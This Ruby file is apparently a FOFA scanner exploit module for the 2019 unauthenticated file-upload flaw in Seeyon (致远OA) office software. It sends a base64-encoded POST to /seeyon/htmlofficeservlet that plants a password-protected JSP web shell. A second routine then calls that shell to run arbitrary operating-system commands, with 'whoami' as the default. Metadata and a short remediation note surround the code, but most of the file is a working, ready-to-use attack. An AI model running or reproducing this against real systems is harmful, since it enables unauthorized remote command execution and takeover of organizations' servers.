if __FILE__ == $0
  require_relative '../fofascan'
end

require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
	{
      "Name": "致远OA 无需登录文件上传漏洞",
      "Description": "致远OA  2019-6-26 ",
      "Product": "OA系统",
      "Homepage": "http://www.seeyon.com/",
      "DisclosureDate": "2019-06-26",
      "Author": "Greekn",
      "FofaQuery": "app=\"seeyon\"",
      "Level": "3",
      "Impact": "<p>导致黑客可以上传恶意文件到服务器，获取服务器权限。</p>",
      "Recommandation": "<p>1、上传文件的存储目录禁用执行权限。</p><p>2、文件的后缀白名单。</p><p>3、升级至最新版本。</p>",
      "References": [
            "http://www.seeyon.com/"
      ],
      "HasExp": true,
      "ExpParams": [
            {
                  "name": "cmd",
                  "type": "input",
                  "value": "whoami"
            }
      ],
      "is0day": false,
      "ExpTips": {
            "type": "Tips",
            "content": "执行系统命令"
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "POST",
                        "uri": "/seeyon/htmlofficeservlet",
                        "follow_redirect": false,
                        "header": {
                              "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
                              "Pragma": "no-cache",
                              "Content-Type": "application/x-www-form-urlencoded"
                        },
                        "data_type": "base64",
                        "data": "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0Ii5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoInB3ZCIpKSYmISIiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpKXtvdXQucHJpbnRsbigiPHByZT4iK2V4Y3V0ZUNtZChyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpICsgIjwvcHJlPiIpO31lbHNle291dC5wcmludGxuKCI6LSkiKTt9JT42ZTRmMDQ1ZDRiODUwNmJmNDkyYWRhN2UzMzkwZDdjZQ=="
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "666",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "Posttime": "2019-06-27 03:57:32",
      "fofacli_version": "3.10.4",
      "fofascan_version": "0.1.16",
      "status": "1"
}
	end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
    host, port = hostinfo.split(":")
    http = Net::HTTP.new(host, port)
    http.open_timeout = 5
    cmd = fetch_cfg('cmd')
    path = "/seeyon/test123456.jsp?pwd=asasd3344&cmd=#{cmd}"
    resp = http.get(path)
    out = { "state": 1, "progress": 30, "output": "", "error": "" }
    puts out.to_json
    body = resp.body.force_encoding('UTF-8')
    if body&&body.empty?
      out = { "state": 3, "progress": 100, "output": body, "error": "failed" }
      puts out.to_json
    else body.include? "bin/sh: /usr/script/: Permission denied"
      out = { "state": 2, "progress": 100, "output": body, "error": "failed" }
      puts out.to_json
    end 
 
  end
end
if __FILE__ == $0
  do_my_scan($0, ARGV)
end